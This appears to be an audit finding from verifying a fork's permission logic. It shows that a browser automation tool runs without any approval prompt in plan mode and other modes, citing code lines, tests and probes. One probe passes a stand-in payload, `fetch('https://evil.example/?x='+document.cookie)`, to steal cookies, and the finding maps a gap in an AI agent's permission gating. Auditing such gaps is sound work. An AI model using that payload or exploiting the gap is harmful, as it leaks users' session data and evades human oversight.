why: All three checks pass. (1) DOC: `curl -sL https://code.claude.com/docs/en/chrome.md` (294 lines) carries the sentence VERBATIM at line 106 under the heading `### Browser tools in plan mode` (line 104); `grep -c -F` on the full sentence returns 1. The whole line is that one sentence — no second half reverses it. The two lines after it enumerate the split (read-only: read_page, get_page_text, find, console/network reads, screenshot; state-changing: clicks, typing, navigation, tab and window management, GIF recording) and line 110 adds the v2.1.199 refinement that a read-only call setting a state-changing input flag also prompts, and that browser_batch runs promptless only when every action inside it is read-only. (2) CODE: mode-manager.ts:2208 reads exactly `if (isBrowserToolNameOrAlias(toolName)) { return { allowed: true }; }`, inside the branch commented `// Safe/Plan mode: check against read-only allowlist` (:2192), reached by `plan` because `isInteractiveWritePermissionMode` (mode-types.ts:98-100) returns only for default/acceptEdits/auto. The tool really is a single command-string tool (BrowserToolSchema, session-tools-core/src/tool-defs.ts:359-364), and browser-tools-permissions.test.ts:21 really is `it('allows browser_tool in safe mode'` with no command-level split. (3) CONSEQUENCE, verified separately by direct probe of shouldAllowToolInMode rather than by reading the identifier: in `plan`, `browser_tool` with command `snapshot`, `click @e1`, `fill @e5 hello`, `navigate https://example.com`, `evaluate document.body.innerHTML=""` and `mcp__session__browser_tool` with `evaluate fetch('https://evil.example/?x='+document.cookie)` ALL return `{"allowed":true}` with no `requiresPermission`, while `Write` in the same mode returns allowed:false. Nothing upstream or downstream rescues it: pre-tool-use.ts contains zero occurrences of `browser` (grep -a), the only browser-specific gate before execution is the prerequisite-manager guide-read block (prerequisite-manager.ts:129-138), which is mode-independent and not a permission prompt; browser-tools.ts / browser-tool-runtime.ts contain no approval/permission path; and tool exposure is filtered only by `getBrowserToolEnabled()` (pi-agent.ts:1611), not by mode, so the tool is live in plan mode. A second, independent classification agrees with the auto-allow rather than overriding it: tool-defs.ts:1000 declares `safeMode: 'allow'` for browser_tool. Not an owner decision: `docs/superpowers/specs/2026-07-29-inert-worklist.md` has zero occurrences of `browser` (grep -ain), so this is none of the nine dated decisions in section 3. Not a deliberate product difference either: it is not a subscription flow, gateway or rename matter, and the fork ships a first-class browser automation surface with a genuine read/write command split (read-only: snapshot, find, screenshot, screenshot-region, console, network, windows, get-clipboard; state-changing: click, click-at, drag, fill, type, select, key, scroll, navigate, back, forward, upload, paste, set-clipboard, evaluate, window-resize, close, hide). The machinery to implement the split already exists on both sides: plan mode CAN prompt (mode-manager's toolRule 'ask' path returns `{allowed:true, requiresPermission:true}`, and the plan shell band is consumed at pre-tool-use.ts:1339-1352), and command-verb parsing from the same single-string input is already implemented for another purpose in `packages/server-core/src/domain/browser-tool-detection.ts:getBrowserToolCommandVerb`.
correctedState: Correct in substance; two corrections to the evidence. (a) The cited line is the SECOND of two auto-allows, not the only one: `'browser_tool'` is a member of `ALWAYS_ALLOWED_TOOLS` (packages/shared/src/agent/mode-manager.ts:2001, in the block commented 'Tools that are always allowed in any mode (read-only by nature)'), so a canonical or `mcp__session__`-namespaced call already returns allowed at :2195/:2202 and never reaches :2208; line 2208 is the fallback that catches the 19 legacy aliases in LEGACY_BROWSER_TOOL_ALIASES. Both paths auto-allow, so the consequence is unchanged — a fix must remove or condition BOTH. (b) The gap is wider than plan mode: browser_tool also returns `{allowed:true}` with no `requiresPermission` in `default` and `explore`, i.e. no browser command ever prompts in any prompting mode (only `dontAsk` denies, at :2184-2190, whose own comment calls the browser tool 'PERMISSION-REQUIRED per tools-reference.md' — an internal contradiction with the unconditional allow 20 lines later). Separately, the coverage map's row for this page (docs/superpowers/specs/2026-07-31-claude-coverage-map.md:233) verdicts chrome as '⬜ вне продукта; вердикт записан, страница не открывалась'; that verdict is too broad and should be narrowed. The Chrome-extension delivery surface is genuinely out of product, but this page's `### Browser tools in plan mode` section is about browser-tool permission semantics, which this fork does have.
